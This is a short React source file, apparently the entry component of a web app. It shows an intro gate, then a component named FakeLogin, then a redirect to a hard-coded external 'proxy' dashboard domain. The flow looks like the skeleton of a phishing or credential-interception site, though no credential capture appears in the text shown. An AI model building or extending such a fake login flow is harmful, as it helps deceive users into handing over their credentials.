import { useCallback, useState } from 'react';
import FakeLogin from './pages/FakeLogin';
import IntroGate from './pages/IntroGate';

const PROXY_URL = 'https://dashboard.aidenybarras-egirl-is.online';

const App = () => {
  const [phase, setPhase] = useState('intro');

  const handleSplashBypass = useCallback(() => {
    setPhase('login');
  }, []);

  const handleLoginSuccess = useCallback(() => {
    window.location.href = PROXY_URL;
  }, []);

  if (phase === 'intro') return <IntroGate onContinue={handleSplashBypass} />;
  return <FakeLogin onSuccess={handleLoginSuccess} />;
};

export default App;
